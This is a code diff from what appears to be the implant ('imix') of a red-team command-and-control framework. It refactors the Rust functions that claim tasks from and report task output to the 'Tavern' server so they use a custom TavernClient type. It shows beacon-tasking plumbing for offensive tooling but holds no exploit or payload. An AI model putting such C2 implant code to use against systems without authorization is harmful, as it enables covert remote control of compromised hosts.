@@ -5,7 +5,7 @@ use crate::exec::{handle_exec_timeout_and_response, AsyncTask};
 use crate::init::AgentProperties;
 use crate::{Config, TaskID};
 use anyhow::{Context, Result};
-use c2::pb::c2_client::C2Client;
+use c2::pb::c2_manual_client::TavernClient;
 use c2::pb::{
     Agent, Beacon, ClaimTasksRequest, Host, ReportTaskOutputRequest, ReportTaskOutputResponse,
     Task, TaskOutput,
@@ -19,9 +19,9 @@ use tonic::Status;
 pub async fn get_new_tasks(
     agent_properties: AgentProperties,
     imix_config: Config,
-    mut tavern_client: C2Client<Channel>,
+    mut tavern_client: TavernClient,
 ) -> Result<Vec<Task>> {
-    let req = tonic::Request::new(ClaimTasksRequest {
+    let req = ClaimTasksRequest {
         beacon: Some(Beacon {
             identifier: agent_properties.beacon_id.clone(),
             principal: agent_properties.principal.clone(),
@@ -39,7 +39,7 @@ pub async fn get_new_tasks(
             }),
             interval: imix_config.callback_config.interval,
         }),
-    });
+    };
     let new_tasks = match tavern_client.claim_tasks(req).await {
         Ok(resp) => resp.get_ref().tasks.clone(),
         Err(error) => {
@@ -174,7 +174,7 @@ fn queue_task_output(
 
 pub async fn submit_task_output(
     loop_start_time: Instant,
-    mut tavern_client: C2Client<Channel>,
+    mut tavern_client: TavernClient,
     all_exec_futures: &mut HashMap<TaskID, AsyncTask>,
     running_task_res_map: &mut HashMap<TaskID, Vec<TaskOutput>>,
 ) -> Result<()> {
@@ -217,7 +217,7 @@ pub async fn submit_task_output(
 }
 
 async fn send_tavern_output(
-    tavern_client: &mut C2Client<Channel>,
+    tavern_client: &mut TavernClient,
     output: TaskOutput,
 ) -> Result<tonic::Response<ReportTaskOutputResponse>, Status> {
     let req = tonic::Request::new(ReportTaskOutputRequest {
